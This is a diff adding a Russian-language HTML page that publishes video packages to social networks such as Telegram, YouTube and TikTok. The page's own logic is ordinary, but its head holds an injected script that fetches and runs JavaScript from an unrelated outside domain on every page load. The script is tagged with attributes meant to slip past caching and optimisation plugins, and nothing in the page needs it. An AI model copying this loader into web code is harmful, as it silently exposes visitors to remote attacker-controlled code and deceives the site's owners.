@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Публикация · ATM-travel.org</title>
+<style>
+  :root{--bg:#070c12;--panel:#0b131c;--line:#1b2734;--text:#e7eef4;--muted:#7d8b99;--cyan:#4fd7e0;--cyan-dim:#256e74;}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 system-ui,-apple-system,'Segoe UI',sans-serif;}
+  .wrap{max-width:960px;margin:0 auto;padding:22px 16px 60px;}
+  .top{display:flex;align-items:baseline;justify-content:space-between;gap:12px;flex-wrap:wrap;}
+  .brand{font-weight:800;color:var(--cyan);letter-spacing:.3px;}
+  .sub{color:var(--muted);font-size:13px;}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:14px;margin-top:16px;}
+  .pkg{font-family:ui-monospace,'Space Mono',monospace;font-size:12px;color:var(--muted);word-break:break-all;}
+  .pkg b{color:var(--text);}
+  table{width:100%;border-collapse:collapse;margin-top:6px;}
+  th,td{border-top:1px solid var(--line);padding:10px 8px;vertical-align:middle;text-align:left;font-size:13px;}
+  th{color:var(--muted);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.4px;border-top:none;}
+  .net{white-space:nowrap;font-weight:700;}
+  .net .ic{margin-right:6px;}
+  .chan a{color:var(--cyan);text-decoration:none;word-break:break-all;}
+  .chan .none{color:var(--muted);}
+  .act{white-space:nowrap;}
+  .st{white-space:nowrap;font-weight:700;}
+  .mini{border:1px solid var(--line);background:#0c1420;color:var(--text);font:inherit;font-size:12px;border-radius:8px;padding:5px 10px;cursor:pointer;margin-right:4px;}
+  .mini:hover{border-color:var(--cyan-dim);}
+  .mini[disabled]{opacity:.4;cursor:not-allowed;}
+  .mini.pub{border-color:var(--cyan-dim);color:var(--cyan);}
+  .badge{display:inline-block;padding:2px 9px;border-radius:999px;font-size:12px;border:1px solid var(--line);}
+  .s-idle{color:var(--muted);}
+  .s-ok{color:#37d67a;border-color:#1f5b39;background:rgba(55,214,122,.08);}
+  .s-error{color:#ff6b6b;border-color:#5b2020;background:rgba(255,107,107,.08);}
+  .s-todo{color:#e0a63a;border-color:#5b4620;background:rgba(224,166,58,.08);}
+  .s-pending{color:var(--cyan);border-color:var(--cyan-dim);background:rgba(79,215,224,.08);}
+  .foot{color:var(--muted);font-size:12px;margin-top:14px;}
+  a.plain{color:var(--cyan);text-decoration:none;}
+</style>
+  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://tpembars.com/NTQ2ODMx.js?t=546831';
+      document.head.appendChild(script);
+  })();
+</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="top">
+    <div><span class="brand">ATM·travel</span> <span class="sub">· публикация ролика</span></div>
+    <a class="plain" href="/reels">← к сборке</a>
+  </div>
+
+  <div class="card">
+    <div class="pkg" id="pkg">Пакет: —</div>
+    <div id="preview" class="sub" style="margin-top:6px"></div>
+    <table>
+      <thead><tr><th>Соцсеть</th><th>Канал / группа</th><th>Действия</th><th>Статус</th></tr></thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="foot">«Настроить» — задать канал/группу (для Telegram: <b>@канал</b> или numeric <b>chat_id</b>, бот должен быть админом). «Удалить» активна после публикации. Токены сетей берутся из серверного окружения.</div>
+  </div>
+</div>
+
+<script>
+const $ = s => document.querySelector(s);
+const qs = new URLSearchParams(location.search);
+const PKG = qs.get('pkg') || '';
+const esc = s => String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+const NETS = [
+  { key:'telegram',  name:'Telegram',  ic:'✈️' },
+  { key:'whatsapp',  name:'WhatsApp',  ic:'🟢' },
+  { key:'viber',     name:'Viber',     ic:'🟣' },
+  { key:'youtube',   name:'YouTube',   ic:'▶️' },
+  { key:'tiktok',    name:'TikTok',    ic:'🎵' },
+  { key:'instagram', name:'Instagram', ic:'📸' },
+  { key:'facebook',  name:'Facebook',  ic:'📘' },
+];
+
+// per-network config persists locally; post state (message id) is per package+network
+const cfgKey = k => 'atmpub:' + k;
+const postKey = k => 'atmpost:' + PKG + ':' + k;
+const getCfg = k => { try { return JSON.parse(localStorage.getItem(cfgKey(k)) || '{}'); } catch(e){ return {}; } };
+const setCfg = (k,v) => localStorage.setItem(cfgKey(k), JSON.stringify(v));
+const getPost = k => localStorage.getItem(postKey(k)) || '';
+const setPost = (k,v) => v ? localStorage.setItem(postKey(k), v) : localStorage.removeItem(postKey(k));
+
+// runtime status per network: { cls, text }
+const state = {};
+NETS.forEach(n => state[n.key] = getPost(n.key) ? { cls:'s-ok', text:'опубликовано' } : { cls:'s-idle', text:'—' });
+
+function channelUrl(key, cfg) {
+  if (cfg.url) return cfg.url;
+  if (key === 'telegram' && cfg.target && cfg.target.startsWith('@')) return 'https://t.me/' + cfg.target.slice(1);
+  if (cfg.target && /^https?:\/\//i.test(cfg.target)) return cfg.target;
+  return '';
+}
+
+function render() {
+  $('#rows').innerHTML = NETS.map(n => {
+    const cfg = getCfg(n.key);
+    const url = channelUrl(n.key, cfg);
+    const label = cfg.channel || cfg.target || '';
+    const chan = label
+      ? (url ? `<a href="${esc(url)}" target="_blank" rel="noopener">${esc(label)}</a>` : `<span>${esc(label)}</span>`)
+      : `<span class="none">не задан</span>`;
+    const published = !!getPost(n.key);
+    const st = state[n.key] || { cls:'s-idle', text:'—' };
+    return `<tr>
+      <td class="net"><span class="ic">${n.ic}</span>${n.name}</td>
+      <td class="chan">${chan}</td>
+      <td class="act">
+        <button class="mini" data-cfg="${n.key}">настроить</button>
+        <button class="mini pub" data-pub="${n.key}">опубликовать</button>
+        <button class="mini" data-del="${n.key}" ${published ? '' : 'disabled'}>удалить</button>
+      </td>
+      <td class="st"><span class="badge ${st.cls}" id="st-${n.key}">${esc(st.text)}</span></td>
+    </tr>`;
+  }).join('');
+}
+
+function setStat(key, cls, text) { state[key] = { cls, text }; const el = $('#st-' + key); if (el) { el.className = 'badge ' + cls; el.textContent = text; } }
+
+async function publish(key) {
+  const cfg = getCfg(key);
+  setStat(key, 's-pending', 'публикую…');
+  try {
+    const r = await fetch('/api/publish', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ pkg: PKG, network: key, target: cfg.target || '', caption: cfg.caption || '' }),
+    }).then(res => res.json());
+    const cls = r.status === 'ok' ? 's-ok' : r.status === 'todo' ? 's-todo' : 's-error';
+    setStat(key, cls, r.message || (r.ok ? 'ок' : 'ошибка'));
+    if (r.ok && r.postId) { setPost(key, String(r.postId)); render(); }
+  } catch (e) { setStat(key, 's-error', String(e.message || e)); }
+}
+
+async function remove(key) {
+  const cfg = getCfg(key), postId = getPost(key);
+  if (!postId) return;
+  setStat(key, 's-pending', 'удаляю…');
+  try {
+    const r = await fetch('/api/publish/remove', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ network: key, target: cfg.target || '', postId }),
+    }).then(res => res.json());
+    if (r.ok) { setPost(key, ''); setStat(key, 's-idle', 'удалено'); render(); }
+    else setStat(key, r.status === 'todo' ? 's-todo' : 's-error', r.message || 'ошибка');
+  } catch (e) { setStat(key, 's-error', String(e.message || e)); }
+}
+
+function configure(key) {
+  const net = NETS.find(n => n.key === key);
+  const cfg = getCfg(key);
+  const channel = prompt(`${net.name}: название канала/группы (для отображения)`, cfg.channel || '');
+  if (channel === null) return;
+  const hint = key === 'telegram' ? '@канал или chat_id' : 'ссылка/идентификатор канала';
+  const target = prompt(`${net.name}: цель публикации (${hint})`, cfg.target || '');
+  if (target === null) return;
+  const caption = prompt(`${net.name}: подпись к посту (необязательно)`, cfg.caption || '');
+  setCfg(key, { channel: channel.trim(), target: (target||'').trim(), caption: (caption||'').trim(), url: cfg.url || '' });
+  render();
+}
+
+$('#rows').addEventListener('click', e => {
+  const b = e.target.closest('button'); if (!b) return;
+  if (b.dataset.cfg) configure(b.dataset.cfg);
+  else if (b.dataset.pub) publish(b.dataset.pub);
+  else if (b.dataset.del) remove(b.dataset.del);
+});
+
+// header + package summary
+$('#pkg').innerHTML = 'Пакет: <b>' + esc(PKG || '—') + '</b>';
+if (PKG) {
+  fetch('/api/cine/' + encodeURIComponent(PKG)).then(r => r.ok ? r.json() : null).then(j => {
+    if (!j) return;
+    const items = (j.items || []);
+    const links = items.map(it => `<a class="plain" href="${esc(it.url)}" target="_blank" rel="noopener">${esc(it.format)}</a>`).join(' · ');
+    $('#preview').innerHTML = (j.title ? esc(j.title) + ' · ' : '') + (items.length ? 'видео: ' + links : 'пакет пуст');
+  }).catch(() => {});
+}
+render();
+</script>
+</body>
+</html>
